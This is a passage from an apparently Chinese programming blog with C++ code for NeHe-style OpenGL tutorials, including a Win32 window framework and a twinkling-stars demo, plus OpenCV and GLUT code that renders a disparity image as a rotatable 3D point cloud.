			else							// 不是，处理窗口消息
			{
				TranslateMessage(&msg);				// 翻译消息
				DispatchMessage(&msg);				// 发送消息
			}
		}
		else								// 如果没有消息
		{
				// 绘制场景。监视ESC键和来自DrawGLScene()的退出消息
			if (active)						// 程序激活的么?
			{
				if (keys[VK_ESCAPE])				// ESC 按下了么?
				{
					done=TRUE;				// ESC 发出退出信号
				}
				else						// 不是退出的时候，刷新屏幕
				{
					DrawGLScene();				// 绘制场景
					SwapBuffers(hDC);			// 交换缓存 (双缓存)
				}
			}
			if (keys[VK_F1])					// F1键按下了么?
			{
				keys[VK_F1]=FALSE;				// 若是，使对应的Key数组中的值为 FALSE
				KillGLWindow();					// 销毁当前的窗口
				fullscreen=!fullscreen;				// 切换 全屏 / 窗口 模式
				// 重建 OpenGL 窗口
				if (!CreateGLWindow("NeHe's OpenGL 程序框架",640,480,16,fullscreen))
				{
					return 0;				// 如果窗口未能创建，程序退出
				}
			}
		}
	}
// 关闭程序

	KillGLWindow();								// 销毁窗口
	return (msg.wParam);							// 退出程序

}






 





// NeNe_lesson_object.cpp : Defines the entry point for the console application.
//

// NeNe_lesson2.cpp : Defines the entry point for the console application.
//
// setup.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>		// Windows的头文件
#include<stdio.h>
//#include <gl/glew.h>		// 包含最新的gl.h,glu.h库
//#include <gl/glut.h>		// 包含OpenGL实用库
#include <gl/glaux.h>							// GLaux库的头文件
//#include<gl/GLU.h>




#pragma comment(lib, "opengl32.lib") 
#pragma comment(lib, "glu32.lib") 
#pragma comment(lib, "glut32.lib") 
#pragma comment(lib,"glaux.lib")


HGLRC           hRC=NULL;							// 窗口着色描述表句柄
HDC             hDC=NULL;							// OpenGL渲染描述表句柄
HWND            hWnd=NULL;							// 保存我们的窗口句柄
HINSTANCE       hInstance;							// 保存程序的实例

bool	keys[256];								// 保存键盘按键的数组
bool	active=TRUE;								// 窗口的活动标志，缺省为TRUE
bool	fullscreen=TRUE;							// 全屏标志缺省，缺省设定成全屏模式

GLfloat		rtri;						// 用于三角形的角度
GLfloat		rquad;						// 用于四边形的角度

BOOL	twinkle;						// 闪烁的星星
BOOL	tp;							// 'T' 按下了么? 
const int	num=50;							// 绘制的星星数

typedef struct							// 为星星创建一个结构
{
	int r, g, b;						// 星星的颜色
	GLfloat dist;						// 星星距离中心的距离
	GLfloat angle;						// 当前星星所处的角度
}
stars;								// 结构命名为stars
stars star[num];						// 使用 'stars' 结构生成一个包含 'num'个元素的 'star'数组

GLfloat	zoom=-15.0f;						// 星星离观察者的距离
GLfloat tilt=90.0f;						// 星星的倾角
GLfloat	spin;							// 闪烁星星的自转

GLuint	loop;							// 全局 Loop 变量
GLuint	texture[1];						// 存放一个纹理



GLfloat		xrot;								// X 旋转量
GLfloat		yrot;								// Y 旋转量
GLfloat		zrot;								// Z 旋转量



AUX_RGBImageRec *LoadBMP(char *Filename)			// 载入位图文件
{
	FILE *File=NULL;					// 文件句柄

	if (!Filename)						// 确认已给出文件名
	{
		return NULL;					// 若无返回 NULL
	}

	File=fopen(Filename,"r");				// 检查文件是否存在

	if (File)						// 文件存在么?
	{
		fclose(File);					// 关闭文件句柄
		return auxDIBImageLoad(Filename);		// 载入位图并返回指针
	}
	return NULL;						// 如果载入失败返回 NULL
}




int LoadGLTextures()								// 载入位图(调用上面的代码)并转换成纹理
{

	int Status=FALSE;					// 状态指示器

	AUX_RGBImageRec *TextureImage[1];			// 为纹理分配存储空间

	memset(TextureImage,0,sizeof(void *)*1);		// 将指针设为 NULL

	// 载入位图，查错，如果未找到位图文件则退出
	if (TextureImage[0]=LoadBMP("shit.bmp"))
	{
		Status=TRUE;					// 将 Status 设为TRUE

		glGenTextures(1, &texture[0]);			// 创建一个纹理

		// 创建一个线性滤波纹理
		glBindTexture(GL_TEXTURE_2D, texture[0]);
		glTexParameteri(GL_TEXTURE_2D,GL_TEXTURE_MAG_FILTER,GL_LINEAR);
		glTexParameteri(GL_TEXTURE_2D,GL_TEXTURE_MIN_FILTER,GL_LINEAR);
		glTexImage2D(GL_TEXTURE_2D, 0, 3, TextureImage[0]->sizeX, TextureImage[0]->sizeY, 0, GL_RGB, GL_UNSIGNED_BYTE, TextureImage[0]->data);
	}

	if (TextureImage[0])					// 如果纹理存在
	{
		if (TextureImage[0]->data)			// 如果纹理图像存在
		{
			free(TextureImage[0]->data);		// 释放纹理图像所占的内存
		}

		free(TextureImage[0]);				// 释放图像结构
	}

	return Status;						// 返回 Status的值

}


LRESULT	CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);				// WndProc的定义,函数的注册

GLvoid ReSizeGLScene(GLsizei width, GLsizei height)				// 重置OpenGL窗口大小
{
	if (height==0)								// 防止被零除
	{
		height=1;							// 将Height设为1
	}

	glViewport(0, 0, width, height);					// 重置当前的视口

	glMatrixMode(GL_PROJECTION);						// 选择投影矩阵
	glLoadIdentity();							// 重置投影矩阵

	// 设置视口的大小
	gluPerspective(45.0f,(GLfloat)width/(GLfloat)height,0.1f,100.0f);

	glMatrixMode(GL_MODELVIEW);						// 选择模型观察矩阵
	glLoadIdentity();							// 重置模型观察矩阵
}

int InitGL(GLvoid)								// 此处开始对OpenGL进行所有设置
{

	if (!LoadGLTextures())					// 调用纹理载入子例程
	{
		return FALSE;					// 如果未能载入，返回FALSE
	}

	glEnable(GL_TEXTURE_2D);				// 启用纹理映射
	glShadeModel(GL_SMOOTH);				// 启用阴影平滑
	glClearColor(0.0f, 0.0f, 0.0f, 0.5f);			// 黑色背景
	glClearDepth(1.0f);					// 设置深度缓存
	glHint(GL_PERSPECTIVE_CORRECTION_HINT, GL_NICEST);	// 真正精细的透视修正
	glBlendFunc(GL_SRC_ALPHA,GL_ONE);			// 设置混色函数取得半透明效果
	glEnable(GL_BLEND);					// 启用混色

	for (loop=0; loop<num; loop++)				// 创建循环设置全部星星
	{
		star[loop].angle=0.0f;				// 所有星星都从零角度开始
		star[loop].dist=(float(loop)/num)*5.0f;		// 计算星星离中心的距离
		star[loop].r=rand()%256;			// 为star[loop]设置随机红色分量
		star[loop].g=rand()%256;			// 为star[loop]设置随机红色分量
		star[loop].b=rand()%256;			// 为star[loop]设置随机红色分量
	}
	return TRUE;						// 初始化一切OK

	// 初始化 OK

	
}

int DrawGLScene(GLvoid)								// 从这里开始进行所有的绘制
{glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);	// 清除屏幕及深度缓存
	glBindTexture(GL_TEXTURE_2D, texture[0]);		// 选择纹理

	for (loop=0; loop<num; loop++)				// 循环设置所有的星星
	{
		glLoadIdentity();				// 绘制每颗星星之前，重置模型观察矩阵
		glTranslatef(0.0f,0.0f,zoom);			// 深入屏幕里面
		glRotatef(tilt,1.0f,0.0f,0.0f);			// 倾斜视角
		glRotatef(star[loop].angle,0.0f,1.0f,0.0f);	// 旋转至当前所画星星的角度
		glTranslatef(star[loop].dist,0.0f,0.0f);	// 沿X轴正向移动
		glRotatef(-star[loop].angle,0.0f,1.0f,0.0f);	// 取消当前星星的角度
		glRotatef(-tilt,1.0f,0.0f,0.0f);		// 取消屏幕倾斜
		if (twinkle)					// 启用闪烁效果
		{
			// 使用byte型数值指定一个颜色
				glColor4ub(star[(num-loop)-1].r,star[(num-loop)-1].g,star[(num-loop)-1].b,255);
				glBegin(GL_QUADS);			// 开始绘制纹理映射过的四边形
				glTexCoord2f(0.0f, 0.0f); glVertex3f(-1.0f,-1.0f, 0.0f);
				glTexCoord2f(1.0f, 0.0f); glVertex3f( 1.0f,-1.0f, 0.0f);
				glTexCoord2f(1.0f, 1.0f); glVertex3f( 1.0f, 1.0f, 0.0f);
				glTexCoord2f(0.0f, 1.0f); glVertex3f(-1.0f, 1.0f, 0.0f);
				glEnd();				// 四边形绘制结束
		}
			glRotatef(spin,0.0f,0.0f,1.0f);			// 绕z轴旋转星星
		// 使用byte型数值指定一个颜色
			glColor4ub(star[loop].r,star[loop].g,star[loop].b,255);
			glBegin(GL_QUADS);				// 开始绘制纹理映射过的四边形
			glTexCoord2f(0.0f, 0.0f); glVertex3f(-1.0f,-1.0f, 0.0f);
			glTexCoord2f(1.0f, 0.0f); glVertex3f( 1.0f,-1.0f, 0.0f);
			glTexCoord2f(1.0f, 1.0f); glVertex3f( 1.0f, 1.0f, 0.0f);
			glTexCoord2f(0.0f, 1.0f); glVertex3f(-1.0f, 1.0f, 0.0f);
			glEnd();	

			spin+=0.01f;					// 星星的公转
			star[loop].angle+=float(loop)/num;		// 改变星星的自转角度
			star[loop].dist-=0.01f;				// 改变星星离中心的距离
			if (star[loop].dist<0.0f)			// 星星到达中心了么
			{
			star[loop].dist+=5.0f;			// 往外移5个单位
			star[loop].r=rand()%256;		// 赋一个新红色分量
			star[loop].g=rand()%256;		// 赋一个新绿色分量
			star[loop].b=rand()%256;		// 赋一个新蓝色分量
			}
		}
	return TRUE;						// 一切正常
}

	

GLvoid KillGLWindow(GLvoid)							// 正常销毁窗口
{

	if (fullscreen)								// 我们处于全屏模式吗?
	{
		ChangeDisplaySettings(NULL,0);					// 是的话，切换回桌面
		ShowCursor(TRUE);						// 显示鼠标指针
	}
	if (hRC)								// 我们拥有OpenGL渲染描述表吗?
	{
		if (!wglMakeCurrent(NULL,NULL))					// 我们能否释放DC和RC描述表?
		{
			MessageBox(NULL,"释放DC或RC失败。","关闭错误",MB_OK | MB_ICONINFORMATION);
		}
		if (!wglDeleteContext(hRC))					// 我们能否删除RC?
		{
			MessageBox(NULL,"释放RC失败。","关闭错误",MB_OK | MB_ICONINFORMATION);
		}
		hRC=NULL;							// 将RC设为 NULL
	}
		if (hDC && !ReleaseDC(hWnd,hDC))					// 我们能否释放 DC?
		{
			MessageBox(NULL,"释放DC失败。","关闭错误",MB_OK | MB_ICONINFORMATION);
			hDC=NULL;							// 将 DC 设为 NULL
		}
		if (hWnd && !DestroyWindow(hWnd))					// 能否销毁窗口?
		{
			MessageBox(NULL,"释放窗口句柄失败。","关闭错误",MB_OK | MB_ICONINFORMATION);
			hWnd=NULL;							// 将 hWnd 设为 NULL
		}
		if (!UnregisterClass("OpenG",hInstance))				// 能否注销类?
		{
		MessageBox(NULL,"不能注销窗口类。","关闭错误",MB_OK | MB_ICONINFORMATION);
		hInstance=NULL;							// 将 hInstance 设为 NULL
		}
}

BOOL CreateGLWindow(char* title, int width, int height, int bits, bool fullscreenflag)
{

	GLuint		PixelFormat;						// 保存查找匹配的结果

   
	WNDCLASS	wc;							// 窗口类结构
	DWORD		dwExStyle;						// 扩展窗口风格
	DWORD		dwStyle;						// 窗口风格
	RECT WindowRect;							// 取得矩形的左上角和右下角的坐标值
	WindowRect.left=(long)0;						// 将Left   设为 0
	WindowRect.right=(long)width;						// 将Right  设为要求的宽度
	WindowRect.top=(long)0;							// 将Top    设为 0
	WindowRect.bottom=(long)height;						// 将Bottom 设为要求的高度
	fullscreen=fullscreenflag;						// 设置全局全屏标志
	hInstance		= GetModuleHandle(NULL);			// 取得我们窗口的实例
	wc.style		= CS_HREDRAW | CS_VREDRAW | CS_OWNDC;		// 移动时重画，并为窗口取得DC
	wc.lpfnWndProc		= (WNDPROC) WndProc;				// WndProc处理消息
	wc.cbClsExtra		= 0;						// 无额外窗口数据
	wc.cbWndExtra		= 0;						// 无额外窗口数据
	wc.hInstance		= hInstance;					// 设置实例
	wc.hIcon		= LoadIcon(NULL, IDI_WINLOGO);			// 装入缺省图标
	wc.hCursor		= LoadCursor(NULL, IDC_ARROW);			// 装入鼠标指针
	wc.hbrBackground	= NULL;						// GL不需要背景
	wc.lpszMenuName		= NULL;						// 不需要菜单
	wc.lpszClassName	= "OpenG";			// 设定类名字

	if (!RegisterClass(&wc))						// 尝试注册窗口类
	{
		MessageBox(NULL,"注册窗口失败","错误",MB_OK|MB_ICONEXCLAMATION);
		return FALSE;							// 退出并返回FALSE
	}

	if (fullscreen)								// 要尝试全屏模式吗?
	{
		DEVMODE dmScreenSettings;						// 设备模式
		memset(&dmScreenSettings,0,sizeof(dmScreenSettings));			// 确保内存清空为零
		dmScreenSettings.dmSize=sizeof(dmScreenSettings);			// Devmode 结构的大小
		dmScreenSettings.dmPelsWidth	= width;				// 所选屏幕宽度
		dmScreenSettings.dmPelsHeight	= height;				// 所选屏幕高度
		dmScreenSettings.dmBitsPerPel	= bits;					// 每象素所选的色彩深度
		dmScreenSettings.dmFields=DM_BITSPERPEL|DM_PELSWIDTH|DM_PELSHEIGHT;
		// 尝试设置显示模式并返回结果。注: CDS_FULLSCREEN 移去了状态条。
		if (ChangeDisplaySettings(&dmScreenSettings,CDS_FULLSCREEN)!=DISP_CHANGE_SUCCESSFUL)
		{
		// 若模式失败，提供两个选项：退出或在窗口内运行。
			if (MessageBox(NULL,"全屏模式在当前显卡上设置失败！\n使用窗口模式？","NeHe G",MB_YESNO|MB_ICONEXCLAMATION)==IDYES)
			{
				fullscreen=FALSE;				// 选择窗口模式(Fullscreen=FALSE)
			}
			else
			{
				// 弹出一个对话框，告诉用户程序结束
				MessageBox(NULL,"程序将被关闭","错误",MB_OK|MB_ICONSTOP);
				return FALSE;					//  退出并返回 FALSE
			}
		}
	}

	if (fullscreen)								// 仍处于全屏模式吗?
	{
		dwExStyle=WS_EX_APPWINDOW;					// 扩展窗体风格
		dwStyle=WS_POPUP;						// 窗体风格
		ShowCursor(FALSE);						// 隐藏鼠标指针
	}
	else
	{
		dwExStyle=WS_EX_APPWINDOW | WS_EX_WINDOWEDGE;			// 扩展窗体风格
		dwStyle=WS_OVERLAPPEDWINDOW;					//  窗体风格
	}

	AdjustWindowRectEx(&WindowRect, dwStyle, FALSE, dwExStyle);		// 调整窗口达到真正要求的大小
	if (!(hWnd=CreateWindowEx(	dwExStyle,				// 扩展窗体风格
					"OpenG",				// 类名字
					title,					// 窗口标题
					WS_CLIPSIBLINGS |			// 必须的窗体风格属性
					WS_CLIPCHILDREN |			// 必须的窗体风格属性
					dwStyle,				// 选择的窗体属性
					0, 0,					// 窗口位置
					WindowRect.right-WindowRect.left,	// 计算调整好的窗口宽度
					WindowRect.bottom-WindowRect.top,	// 计算调整好的窗口高度
					NULL,					// 无父窗口
					NULL,					// 无菜单
					hInstance,				// 实例
					NULL)))					// 不向WM_CREATE传递任何东东

		{
		KillGLWindow();							// 重置显示区
		MessageBox(NULL,"不能创建一个窗口设备描述表","错误",MB_OK|MB_ICONEXCLAMATION);
		return FALSE;							// 返回 FALSE
		}

	static	PIXELFORMATDESCRIPTOR pfd=					// /pfd 告诉窗口我们所希望的东东，即窗口使用的像素格式
	{
		sizeof(PIXELFORMATDESCRIPTOR),					// 上述格式描述符的大小
		1,												// 版本号
		PFD_DRAW_TO_WINDOW |							// 格式支持窗口
		PFD_SUPPORT_OPENGL |							// 格式必须支持OpenGL
		PFD_DOUBLEBUFFER,								// 必须支持双缓冲
		PFD_TYPE_RGBA,									// 申请 RGBA 格式
		bits,											// 选定色彩深度
		0, 0, 0, 0, 0, 0,								// 忽略的色彩位
		0,												// 无Alpha缓存
		0,												// 忽略Shift Bit
		0,												// 无累加缓存
		0, 0, 0, 0,										// 忽略聚集位
		16,												// 16位 Z-缓存 (深度缓存)
		0,												// 无蒙板缓存
		0,												// 无辅助缓存
		PFD_MAIN_PLANE,									// 主绘图层
		0,												// Reserved
		0, 0, 0											// 忽略层遮罩
	};

	if (!(hDC=GetDC(hWnd)))							// 取得设备描述表了么?
	{
		KillGLWindow();							// 重置显示区
		MessageBox(NULL,"不能创建一种相匹配的像素格式","错误",MB_OK|MB_ICONEXCLAMATION);
		return FALSE;							// 返回 FALSE
	}

	if (!(PixelFormat=ChoosePixelFormat(hDC,&pfd)))				// Windows 找到相应的象素格式了吗?
	{
		KillGLWindow();							// 重置显示区
		MessageBox(NULL,"不能设置像素格式","错误",MB_OK|MB_ICONEXCLAMATION);
		return FALSE;							// 返回 FALSE
	}

	if(!SetPixelFormat(hDC,PixelFormat,&pfd))				// 能够设置象素格式么?
	{
		KillGLWindow();							// 重置显示区
		MessageBox(NULL,"不能设置像素格式","错误",MB_OK|MB_ICONEXCLAMATION);
		return FALSE;							// 返回 FALSE
	}

	if (!(hRC=wglCreateContext(hDC)))					// 能否取得着色描述表?
	{
		KillGLWindow();							// 重置显示区
		MessageBox(NULL,"不能创建OpenGL渲染描述表","错误",MB_OK|MB_ICONEXCLAMATION);
		return FALSE;							// 返回 FALSE
	}

	if(!wglMakeCurrent(hDC,hRC))						// 尝试激活着色描述表
	{
		KillGLWindow();							// 重置显示区
		MessageBox(NULL,"不能激活当前的OpenGL渲然描述表","错误",MB_OK|MB_ICONEXCLAMATION);
		return FALSE;							// 返回 FALSE
	}

	ShowWindow(hWnd,SW_SHOW);						// 显示窗口
	SetForegroundWindow(hWnd);						// 略略提高优先级
	SetFocus(hWnd);								// 设置键盘的焦点至此窗口
	ReSizeGLScene(width, height);            // 设置透视 GL 屏幕

	if (!InitGL())								// 初始化新建的GL窗口
	{
		KillGLWindow();							// 重置显示区
		MessageBox(NULL,"Initialization Failed.","ERROR",MB_OK|MB_ICONEXCLAMATION);
		return FALSE;							// 返回 FALSE
	}

	return TRUE;								// 成功
}

LRESULT CALLBACK WndProc(	HWND	hWnd,					// 窗口的句柄
				UINT	uMsg,					// 窗口的消息
				WPARAM	wParam,					// 附加的消息内容
				LPARAM	lParam)					// 附加的消息内容
{

	switch (uMsg)								// 检查Windows消息
	{
		case WM_ACTIVATE:						// 监视窗口激活消息
		{
			if (!HIWORD(wParam))					// 检查最小化状态
			{
				active=TRUE;					// 程序处于激活状态
			}
			else
			{
				active=FALSE;					// 程序不再激活
			}

			return 0;						// 返回消息循环
		}
		case WM_SYSCOMMAND:						// 系统中断命令
		{
			switch (wParam)						// 检查系统调用
			{
				case SC_SCREENSAVE:				// 屏保要运行?
				case SC_MONITORPOWER:				// 显示器要进入节电模式?
				return 0;					// 阻止发生
			}
			break;							// 退出
		}
		case WM_CLOSE:							// 收到Close消息?
		{
			PostQuitMessage(0);					// 发出退出消息
			return 0;						// 返回
		}
		case WM_KEYDOWN:						// 有键按下么?
		{
			keys[wParam] = TRUE;					// 如果是，设为TRUE
			return 0;						// 返回
		}
		case WM_KEYUP:							// 有键放开么?
		{
			keys[wParam] = FALSE;					// 如果是，设为FALSE
			return 0;						// 返回
		}
		case WM_SIZE:							// 调整OpenGL窗口大小
		{
			ReSizeGLScene(LOWORD(lParam),HIWORD(lParam));		// LoWord=Width,HiWord=Height
			return 0;						// 返回
		}
	}
// 向 DefWindowProc传递所有未处理的消息。
	return DefWindowProc(hWnd,uMsg,wParam,lParam);
}

int WINAPI WinMain(	HINSTANCE	hInstance,				// 当前窗口实例
			HINSTANCE	hPrevInstance,				// 前一个窗口实例
			LPSTR		lpCmdLine,				// 命令行参数
			int		nCmdShow)				// 窗口显示状态
{

	MSG	msg;								// Windowsx消息结构
	BOOL	done=FALSE;							// 用来退出循环的Bool 变量
		// 提示用户选择运行模式
	if (MessageBox(NULL,"你想在全屏模式下运行么？", "设置全屏模式",MB_YESNO|MB_ICONQUESTION)==IDNO)
	{
		fullscreen=FALSE;						// FALSE为窗口模式
	}
		// 创建OpenGL窗口
	if (!CreateGLWindow("shiter's OpenGL程序框架",640,480,16,fullscreen))
	{
		return 0;							// 失败退出
	}
	while(!done)								// 保持循环直到 done=TRUE
	{

 
	if (PeekMessage(&msg,NULL,0,0,PM_REMOVE))			// 有消息在等待吗?
		{
	if (msg.message==WM_QUIT)				// 收到退出消息?
			{
				done=TRUE;					// 是，则done=TRUE
			}
			else							// 不是，处理窗口消息
			{
				TranslateMessage(&msg);				// 翻译消息
				DispatchMessage(&msg);				// 发送消息
			}
		}
		else								// 如果没有消息
		{
				// 绘制场景。监视ESC键和来自DrawGLScene()的退出消息
			if (active)						// 程序激活的么?
			{
				if (keys[VK_ESCAPE])				// ESC 按下了么?
				{
					done=TRUE;				// ESC 发出退出信号
				}
				else						// 不是退出的时候，刷新屏幕
				{
					DrawGLScene();				// 绘制场景
					SwapBuffers(hDC);			// 交换缓存 (双缓存)


					if (keys['T'] && !tp)				// 是否T 键已按下并且 tp值为 FALSE
					{
						tp=TRUE;				// 若是，将tp设为TRUE
						twinkle=!twinkle;			// 翻转 twinkle的值
					}
					if (!keys['T'])					// T 键已松开了么？
					{
						tp=FALSE;				// 若是 ，tp为 FALSE
					}
					if (keys[VK_UP])				// 上方向键按下了么？
					{
						tilt-=0.5f;				// 屏幕向上倾斜
					}

					if (keys[VK_DOWN])				// 下方向键按下了么？
					{
						tilt+=0.5f;				// 屏幕向下倾斜
					}
	
					if (keys[VK_PRIOR])				// 向上翻页键按下了么
					{
						zoom-=0.2f;				// 缩小
					}

					if (keys[VK_NEXT])				// 向下翻页键按下了么？
					{
						zoom+=0.2f;				// 放大
					}

				}
			}

			if (keys[VK_F1])					// F1键按下了么?
			{
				keys[VK_F1]=FALSE;				// 若是，使对应的Key数组中的值为 FALSE
				KillGLWindow();					// 销毁当前的窗口
				fullscreen=!fullscreen;				// 切换 全屏 / 窗口 模式
				// 重建 OpenGL 窗口
				if (!CreateGLWindow("NeHe's OpenGL 程序框架",640,480,16,fullscreen))
				{
					return 0;				// 如果窗口未能创建，程序退出
				}
			}
		}
	}
// 关闭程序

	KillGLWindow();								// 销毁窗口
	return (msg.wParam);							// 退出程序

}







 





编译环境:Microsoft Visual c++ 2010 Express
 
将上一课中的代码做如下修改:
int DrawGLScene(GLvoid)								// 从这里开始进行所有的绘制
{
	//glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);			// 清除屏幕和深度缓存
	//glLoadIdentity();							// 重置当前的模型观察矩阵

	glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);			// 清除屏幕及深度缓存
	glLoadIdentity();							// 重置当前的模型观察矩阵
	glTranslatef(-1.5f,0.0f,-6.0f);						// 左移 1.5 单位，并移入屏幕 6.0

	glBegin(GL_TRIANGLES);							// 绘制三角形
		glVertex3f( 0.0f, 1.0f, 0.0f);					// 上顶点
		glVertex3f(-1.0f,-1.0f, 0.0f);					// 左下
		glVertex3f( 1.0f,-1.0f, 0.0f);					// 右下
	glEnd();		
			
	glTranslatef(3.0f,0.0f,0.0f);						// 右移3单位
		glBegin(GL_QUADS);							//  绘制正方形
		glVertex3f(-1.0f, 1.0f, 0.0f);					// 左上
		glVertex3f( 1.0f, 1.0f, 0.0f);					// 右上
		glVertex3f( 1.0f,-1.0f, 0.0f);					// 左下
		glVertex3f(-1.0f,-1.0f, 0.0f);					// 右下
	glEnd();		




	return TRUE;								//  一切 OK
}

在编译过程中,由于先前所建立的工程是console application所以出现了如下错误:
error LNK2019: unresolved external symbol _main referenced in function ___tmainC
应当做如下修改:
预编译里的_CONSOLE换成_WINDOWS并在LINKER-》system里也换成subsytem:windows






 
 
代码如下：
 
// disparity_to_3d_reconstruction.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"



//Huang,Haiqiao coded on Dec.2009代码出处：
//http://www.opencv.org.cn/forum.php?mod=viewthread&tid=8722&extra=&page=1
#include "stdafx.h"
#include <iostream>
#include <stdlib.h>
//#include <cv.h>
//#include <cxcore.h>
//#include <highgui.h>
#include "opencv2/calib3d/calib3d.hpp"  
#include "opencv2/imgproc/imgproc.hpp"  
#include "opencv2/highgui/highgui.hpp"  
#include "opencv2/contrib/contrib.hpp" 

#pragma comment(lib,"opencv_highgui2410d.lib")  
#pragma comment(lib,"opencv_core2410d.lib")  
#pragma comment(lib,"opencv_imgproc2410d.lib")  
 


#include <math.h>
#include <GL/glut.h>  
#include <iostream>
using namespace cv;

using namespace std;

#define MAX_SIZE 1024

float imgdata[MAX_SIZE][MAX_SIZE];

int w=0;
int h=0;
float scalar=50;//scalar of converting pixel color to float coordinates

void renderScene(void) 
{

	glClear (GL_COLOR_BUFFER_BIT);
	glLoadIdentity();				// Reset the coordinate system before modifying
	gluLookAt (0.0, 0.0, 10.0, 0.0, 0.0, 0.0, 0.0, 1.0, 0.0);
	glRotatef(-30, 0.0, 1.0, 0.0); //rotate about the x axis
	glRotatef(-180, 0.0, 0.0, 1.0); //rotate about the z axis
	glRotatef(-180, 0.0, 1.0, 0.0); //rotate about the y axis

	float imageCenterX = w*.5;
	float imageCenterY = h*.5;
	float x,y,z;
	glPointSize(1.0);
	glBegin(GL_POINTS);//GL_POINTS
	for (int i=0;i<h;i++)
	{
		for (int j=0;j<w;j++)
		{
			// color interpolation
			glColor3f(1-imgdata[i][j]/255, imgdata[i][j]/255, imgdata[i][j]/255);
			x=((float)j-imageCenterX)/scalar;
			y=((float)i-imageCenterY)/scalar;
			z=imgdata[i][j]/scalar;
			glVertex3f(x,y,z);
		}
	}
	glEnd();
	glFlush();
}
void reshape (int w, int h)
{
	glViewport (0, 0, (GLsizei)w, (GLsizei)h);
	glMatrixMode (GL_PROJECTION);
	glLoadIdentity ();
	gluPerspective (60, (GLfloat)w / (GLfloat)h, 1.0, 100.0);
	glMatrixMode (GL_MODELVIEW);
}

void displayDisparity(IplImage* disparity)
{
	double xyscale=100;
	int j=0;
	int i=0;
	CvScalar s;

	//accessing the image pixels
	for (i=0;i<h;i++)
	{
		for (j=0;j<w;j++)
		{
			s = cvGet2D(disparity,i,j);
			imgdata[i][j] = s.val[0];//for disparity is a grey image.
		}
	}
}
int main(int argc, char *argv)
{  
	cout << "OpenCV and OpenGL working together!"<<endl;
	//char* filename = "tsuDisparity.bmp;";

	string image_name;
	cout<<"input image name:"<<endl;
	cin>>image_name;
	IplImage* imgGrey = cvLoadImage(image_name.c_str(),0); //read image as a grey one
	if (imgGrey==NULL)
	{
		cout << "No valid image input."<<endl;
		char c=getchar();
		return 1;
	}
	w = imgGrey->width;
	h = imgGrey->height;

	displayDisparity(imgGrey);
	cvNamedWindow("original", CV_WINDOW_AUTOSIZE );
	cvShowImage("original", imgGrey );

	//------------------OpenGL-------------------------
	glutInit(&argc,(char**)argv);
	glutInitDisplayMode(GLUT_DEPTH | GLUT_SINGLE | GLUT_RGBA);
	glutInitWindowPosition(100,100);
	glutInitWindowSize(500,500);
	glutCreateWindow("3D disparity image");
	glutDisplayFunc(renderScene);
	glutReshapeFunc (reshape);
	glutMainLoop();
	cvWaitKey(0);
	//release opencv stuff.
	cvReleaseImage(&imgGrey);
	cvDestroyWindow("Original");

	return 0;
}





 
 
 
 
效果：
 

 
 

 
 
 
 
添加鼠标移动事件，代码如下：
 
// disparity_to_3d_reconstruction.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"



//Huang,Haiqiao coded on Dec.2009代码出处：
//http://www.opencv.org.cn/forum.php?mod=viewthread&tid=8722&extra=&page=1
#include "stdafx.h"
#include <iostream>
#include <stdlib.h>
//#include <cv.h>
//#include <cxcore.h>
//#include <highgui.h>
#include "opencv2/calib3d/calib3d.hpp"  
#include "opencv2/imgproc/imgproc.hpp"  
#include "opencv2/highgui/highgui.hpp"  
#include "opencv2/contrib/contrib.hpp" 

#pragma comment(lib,"opencv_highgui2410d.lib")  
#pragma comment(lib,"opencv_core2410d.lib")  
#pragma comment(lib,"opencv_imgproc2410d.lib")  



#include <math.h>
#include <GL/glut.h>  
#include <iostream>
using namespace cv;

using namespace std;

#define MAX_SIZE 1024

float imgdata[MAX_SIZE][MAX_SIZE];

int w=0;
int h=0;
float scalar=50;//scalar of converting pixel color to float coordinates

#define pi 3.1415926
bool mouseisdown=false;
bool loopr=false;
int mx,my;
int ry=10;
int rx=10;


void timer(int p)
{
	ry-=5;
	//marks the current window as needing to be redisplayed.
	glutPostRedisplay();
	if (loopr)
		glutTimerFunc(200,timer,0);
}


void mouse(int button, int state, int x, int y)
{
	if(button == GLUT_LEFT_BUTTON)
	{
		if(state == GLUT_DOWN)
		{
			mouseisdown=true;
			loopr=false;
		}
		else
		{
			mouseisdown=false;
		}
	}

	if (button== GLUT_RIGHT_BUTTON)
		if(state == GLUT_DOWN)
		{
			loopr=true;
			glutTimerFunc(200,timer,0);
		}
}

void motion(int x, int y)
{
	if(mouseisdown==true)
	{
		ry+=x-mx;
		rx+=y-my;
		mx=x;
		my=y;
		glutPostRedisplay();
	}
}

void special(int key, int x, int y)
{
	switch(key)
	{
	case GLUT_KEY_LEFT:
		ry-=5;
		glutPostRedisplay();
		break;
	case GLUT_KEY_RIGHT:
		ry+=5;
		glutPostRedisplay();
		break;
	case GLUT_KEY_UP:
		rx+=5;
		glutPostRedisplay();
		break;
	case GLUT_KEY_DOWN:
		rx-=5;
		glutPostRedisplay();
		break;
	}
}


void renderScene(void) 
{

	glClear (GL_COLOR_BUFFER_BIT);
	glLoadIdentity();				// Reset the coordinate system before modifying
	gluLookAt (0.0, 0.0, 10.0, 0.0, 0.0, 0.0, 0.0, 1.0, 0.0);
	//gluLookAt (0.0, 0.0, 7.0, 0.0, 0.0, 1.0, 0.0, 1.0, 0.0);
	//glRotatef(-30, 0.0, 1.0, 0.0); //rotate about the x axis
	//glRotatef(-180, 0.0, 0.0, 1.0); //rotate about the z axis
	//glRotatef(-180, 0.0, 1.0, 0.0); //rotate about the y axis

	glRotatef(ry,0,1,0);
	glRotatef(rx-180,1,0,0);

	float imageCenterX = w*.5;
	float imageCenterY = h*.5;
	float x,y,z;

	glPointSize(1.0);
	glBegin(GL_POINTS);//GL_POINTS

	for (int i=0;i<h;i++)
	{
		for (int j=0;j<w;j++)
		{
			// color interpolation
			glColor3f(1-imgdata[i][j]/255, imgdata[i][j]/255, imgdata[i][j]/255);
			x=((float)j-imageCenterX)/scalar;
			y=((float)i-imageCenterY)/scalar;
			z=imgdata[i][j]/scalar;
			glVertex3f(x,y,z);
		}
	}
	glEnd();
	glFlush();
}
void reshape (int w, int h)
{
